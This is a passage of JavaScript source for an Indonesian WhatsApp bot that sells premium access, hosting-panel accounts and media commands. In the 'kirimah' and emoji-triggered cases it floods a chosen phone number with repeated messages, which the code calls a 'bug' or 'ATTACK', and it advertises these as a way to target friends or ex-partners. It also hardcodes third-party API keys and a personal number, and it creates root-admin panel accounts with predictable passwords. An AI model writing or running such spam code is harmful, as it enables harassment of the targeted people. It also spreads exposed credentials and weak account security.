               if (!m.isGroup) return reply(mess.group)
               if (!isBotAdmins) return mess.botAdmin
               if (!isAdmins) return mess.admin
               if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
               Biiofc.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break
        case 'leave':{
if (m.isGroup && !isOwner && command == "leave") return Biiofc.groupLeave(from)
if (m.isGroup) return reply("Only private chat")
var room = Object.values(anon.anonymous).find(p => p.check(sender))
if (!room) return reply("You are not in the room")
reply("Bye...")
var other = room.other(sender)
delete anon.anonymous[room.id]
if (other != "") Biiofc.sendMessage(other, {
text: "Bye..."
})
if (command == "leave") break;
        }
        case 'kirimah': {
               if (!isPremium && !isOwner) return reply(mess.only.premium)
  if (!quoted) return m.reply('Format salah!!\nContoh: kirimah text,nomor,jumlah');
  
  let params = text.split(',');
  if (params.length < 3) return m.reply('Format salah!!\nContoh: kirim text,nomor,jumlah');

  let messageText = params[0];
  let targetNumber = params[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  let messageCount = parseInt(params[2]);

  if (isNaN(messageCount) || messageCount < 1) return m.reply('Jumlah pesan harus berupa angka yang lebih besar dari 0.');

  const promises = [];
  for (let i = 0; i < messageCount; i++) {
    promises.push(
      Biiofc.sendMessage(targetNumber, {
        text: `*${messageText}*`,
        mentions: [sender]
      }, {
        quoted: lep
      })
    );
  }

  Promise.all(promises)
    .then(() => {
      m.reply(`Berhasil mengirim ${messageCount} bug pesan!`);
    })
    .catch(() => {
      m.reply('Gagal mengirim pesan!');
    });

  break;
}
        case 'done':{
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal`);
let barang = t[0];
let nominal = t[1];
reply(`*━━ TRANSAKSI INFO ━━*

 _• *Barang:* ${barang}_
 _• *Nominal:* ${nominal}_
 _• *Tanggal:* Rp${tanggal}_

*TERIMA KASIH TELAH ORDER DI ${global.namaCreator}*\n*JANGAN LUPA ORDER LAGI YA*🙏`)
}
        break
        case 'pinterest':{
if (!q) return reply(`Gunakan perintah ${command} query
Contoh: ${command} pentoy`);
const pinterest = await axios.get(`https://api.anna.biz.id/api/search/pinterest?query=${q}`);
let hasilnya = pinterest.data.result;
Biiofc.sendMessage(from, {image: {url: hasilnya.url}, caption: `Nih ${pushname} fotonya`}, {quoted: m })
}
break
case 'ai': case 'openai':
try {
if (global.keyopenai === '') return reply("Api key limi exceeded");
if (!q) return reply(`Tanyakan Sesuatu Di AI Bang.\n\nContoh:\n${prefix + command} Apa Itu coding`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
model: "text-davinci-003",
prompt: q,
temperature: 0.3,
max_tokens: 2000,
top_p: 1.0,
frequency_penalty: 0.0,
presence_penalty: 0.0,
});
reply(`${response.data.choices[0].text}`);
} catch (error) {
if (error.response) {
console.log(error.response.status);
console.log(error.response.data);
console.log(`${error.response.status}\n\n${error.response.data}`);
} else {
console.log(error);
reply("Sorry, there seems to be an error :"+ error.message);
}
}
break
        //Bagian Otomatis Menu
        case "buyowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285786539008`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknbos = await Biiofc.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknbos.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Selamat Kepada ${pushname} dengan nomor ${bnnd} telah premium 

Keuntungan Owner👇🏻
-Muncul dalam daftar Owner
-Bisa Akses Semua Bug
-Bisa Create Panel
-Bisa Bug Temen Usil
-Bisa Bug Mantan

NOTE:WAJIB JEDA GA JEDA? DELPREM 
#ALL TRX NO REFF`)
        minSaldo(sender, 10000, db_saldo)
break
        case "buyprem":{
if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285786539008`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Selamat Kepada ${pushname} dengan nomor ${prrkek} telah premium 

Keuntungan Premium👇🏻
-Bisa Akses Semua Bug
-Bisa Create Panel
-Bisa Bug Temen Usil
-Bisa Bug Mantan

NOTE:WAJIB JEDA GA JEDA? DELPREM 
#ALL TRX NO REFF`)
}
   minSaldo(sender, 10000, db_saldo)     
break
        case 'minsaldo':
if (!isOwner) m.reply(`f`) 
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah kak🙏`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(50)
m.reply(`「 *SALDO USER* 」
⭔ID: ${q.split(",")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Tanggal: ${tanggal}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break
                case 'buysc': {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/cwx1g4zrv8ff9gn/v3.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
   case 'bukti':{
           let jumlah = args[0]
           if (!jumlah) return reply('Jumblah nya?')
reply('OKE KAK DEPOSIT SEDANG DI PROSES MOHON MENUNGGU SAMPAI OWNER MENGKONFIRMASI DEPOSIT TERSEBUT')
Biiofc.sendMessage('6285786539008@s.whatsapp.net', { text: `*ADA YANG DEPOSIT NIH*\n*SEJUMLAH ${jumlah} DARI @${sender.split('@')[0]}*\n*INGIN ACC DEPOSIT? KETIK*\n*${prefix}acc MAU NOLAK? BIARIN AJA*`, mentions: [sender]}, { quoted: hw })
        }
        break
                case 'saldo':{
reply(`*━━ CHECK YOUR INFO ━━*

 _• *Name:* ${pushname}_
 _• *Nomer:* ${sender.split('@')[0]}_
 _• *Saldo:* Rp${toRupiah(cekSaldo(sender, db_saldo))}_

*Note :*
_Saldo hanya bisa untuk beli di bot_
_Tidak bisa ditarik atau transfer_!`)
}
break
        case 'setppbot': case 'setbotpp': {
if (!isOwner) return reply(mess.owner)
if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
var medis = await Biiofc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/panjang`) {
var { img } = await generateProfilePicture(medis)
await Biiofc.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`Success`)
} else {
var memeg = await Biiofc.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`Success`)
}
}
break
        case 'afk': {
if (!m.isGroup) return reply(mess.only.group)
if (!text) return reply(`contoh ${prefix+command} mau turu ah`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
reply(`${m.pushName} Has Gone AFK\nReason : ${args.join(" ") ? args.join(" ") : ''}`)
}
break
        case 'tiktok':{ 
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
reply(mess.wait)
require('./all/tiktok.js').Tiktok(q).then( data => {
Biiofc.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
          case 'qris': {
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0464e57d0e8b59e6bc5d9.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case 'dana': {
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/818c7a5e066b0708e56fa.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case "deposit":
        depo = `PILIH PAYMENT DEPOSIT DIBAWAH DAN SEBUTKAN NOMINALNYA
contoh : ${prefix}dana 5000

${prefix}dana✅
${prefix}qris✅`
        Biiofc.sendMessage(from, {text : depo}, {quoted : hw}) 
        break      
    case "buysrv": {
const owned = `0@s.whatsapp.net`
const version = require("baileys/package.json").version
const textsrv = `*Hi @${sender.split("@")[0]} 👋*
*── 「 Bii Botz 」 ──*				   	
• *Saldo:* _Rp${toRupiah(cekSaldo(sender, db_saldo))}_
• *Name:* ${pushname}
• *Id*: _${sender.replace("@s.whatsapp.net", "")}_
  
   *｢ LIST SERVER ｣*
⭔●${prefix}srvpaket1 _*Ram 1GB/1GB Cpu 30%*_
⭔●${prefix}srvpaket2 _*Ram 2GB/2GB Cpu 60%*_
⭔●${prefix}srvpaket3 _*Ram 3GB/3GB Cpu 90%*_
⭔●${prefix}srvpaket4 _*Ram 4GB/4GB Cpu 120%*_
⭔●${prefix}srvpaket5 _*Ram 5GB/5GB Cpu 150%*_
⭔●${prefix}srvpaket6 _*Ram UNLI/UNLI Cpu UNLI*_

_*NOTE:*_ pilih salah satu yang saldo kamu cukup

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: textsrv, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
                case 'acc':{
if (!isOwner) return reply('hadeh')
if (!q.split(",")[0]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
reply(`「 *SALDO USER* 」
⭔ID: @${sender.split("@")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Tanggal: ${tanggal}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
                }
        case 'kirim': {
                    let messageText = `DONE KAK DEPOSIT SUDAH BERHASIL SEJUMLAH  ${q.split(",")[1]} TELAH DITAMBAHKAN KE SALDO ANDA CEK SALDO KETIK .SALDO TERIMAKASIH`
  let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

  Biiofc.sendMessage(targetNumber, {
    text: `*${messageText}*`,
    mentions: [sender]
  }, {
    quoted: hw
  }).then(() => {
    m.reply('Acc berhasil!');
  }).catch(() => {
    m.reply('Gagal mengirim pesan!');
  });
}
break;
        //Diatas case kirim jangan dihapus ntr error
        case 'unlitet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '😎': case '😈': case '🗿':  {
   if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: 'DONE!!!'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: 'DONE!!!'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: 'DONE!!!!'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000) 
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb YanzOffc`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://instagram.com/fahrul_mt", 
"sourceUrl": "https://instagram.com/fahrul_mt" }}}, { quoted: m })
}
break
        case 'china': {
result = await getBuffer(`https://api.xyroinee.xyz/api/asupan/image/china?apikey=FIZEVWnuDf`)
Biiofc.sendMessage(m.chat, {image: result, caption: "nih bang", mimetype: 'image/png'}, {quoted:m})
}
break
        case 'lokal': {
result = await getBuffer(`https://api.xyroinee.xyz/api/asupan/image/indonesia?apikey=FIZEVWnuDf`)
Biiofc.sendMessage(m.chat, {image: result, caption: "nih bang", mimetype: 'image/png'}, {quoted:m})
}
break
case 'korea': {
result = await getBuffer(`https://api.xyroinee.xyz/api/asupan/image/korean?apikey=FIZEVWnuDf`)
Biiofc.sendMessage(m.chat, {image: result, caption: "nih bang", mimetype: 'image/png'}, {quoted:m})
}
break 
case 'jepang': {
result = await getBuffer(`https://api.xyroinee.xyz/api/asupan/image/japan?apikey=FIZEVWnuDf`)
Biiofc.sendMessage(m.chat, {image: result, caption: "nih bang", mimetype: 'image/png'}, {quoted:m})
}
break

        //bagian panel
        case 'buyakn':{
if (cekSaldo(sender,db_saldo) < 2000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp2.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!q.split(',')[0]) return reply(`Ex : ${prefix+command} email,username\n\nContoh :\n${prefix+command} contoh@gmail.com,contoh`)
if (!q.split(',')[1]) return reply(`Ex : ${prefix+command} email,username\n\nContoh :\n${prefix+command} contoh@gmail.com,contoh`)
let d = (await Biiofc.onWhatsApp(sender.split('@')[0]))[0] || {}
let psswd = d.exists ? require("crypto").randomBytes(5).toString('hex') : username+'7739'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": q.split(',')[0],
"username": q.split(',')[1],
"first_name": q.split(',')[1],
"last_name": "Memb",
"language": "en",
"password": psswd
})
})
let res = await f.json();
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2));
Biiofc.sendMessage(from, { text: `*SUCCESSFULLY BUY USER*\n\n*TYPE:* user\n\n*ID:* ${res.attributes.id}\n*UUID:* ${res.attributes.uuid}\n*USERNAME:* ${res.attributes.username}\n*EMAIL:* ${res.attributes.email}\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n*CREATED AT:* ${res.attributes.created_at}\n\n*Password telah dikirim ke @${sender.split('@')[0]}*`, mentions: [sender]}, { quoted: m })
    Biiofc.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${res.attributes.email}\n*USERNAME:* ${res.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain}\n\n*NOTE*\n_*BOT* atau *CLIENT Biistore* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\nUntuk Membeli server ketik ${prefix}buysrv ya\n\n#TERIMAKASIH`,})
}    
        
        break
       case "ramlist":

lrm = `RAM YANG TERSEDIA :
1GB ✅
2GB ✅
3GB ✅
4GB ✅
5GB ✅
UNLI (KHUSUS ADMIN SERVER)`
Biiofc.sendMessage(from, {text : lrm}, {quoted : m})
break 
        case "panel": {
const owned = `${owner}@s.whatsapp.net`
const text12 = `*Hi @${sender.split("@")[0]} 👋*

BII 
BY YANZ HOSTING

CARA ADD USER PANEL :
ram user,nomer

contoh : 1gb udin,6285786539008

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
                case "listsrv": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        case "bocil": case "ukhty": case "ghea": case "santuy":{
const response = await axios.get(`https://api.botcahx.live/api/asupan/bocil?apikey=3jhFDifC`);
let res = response.data['respon'];
Biiofc.sendMessage(from, {video: {url: `${res}`}, caption: "Jangan lupa bilang makasih😁"}, {quoted: m })
}
break
              case "listusr": {
  if (!isOwner) return reply(mess.only.premium)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case 'tourl': {

m.reply(mess.wait)

let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./all/uploader')

let media = await Biiofc.downloadAndSaveMediaMessage(quoted)

if (/image/.test(mime)) {

let anu = await TelegraPh(media)

m.reply(util.format(anu))

} else if (!/image/.test(mime)) {

let anu = await UploadFileUgu(media)

m.reply(util.format(anu))

}

await fs.unlinkSync(media)

}

break
        case "delsrv": {
      if (!isOwner) return reply(`KHUSUS OWN `)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
        case "delusr": {
  if (!isOwner) return reply(`KHUSUS OWNER`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
                case "addusr": {

if (!isOwner) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let t = text.split(',');
if (t.length < 3) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await Biiofc.sendMessage(m.chat, { text: `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`, mentions:[u],
})
Biiofc.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break
                case "crateadmin": {
if (!isOwner) return reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)
if (!isOwner) return reply(mess.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }
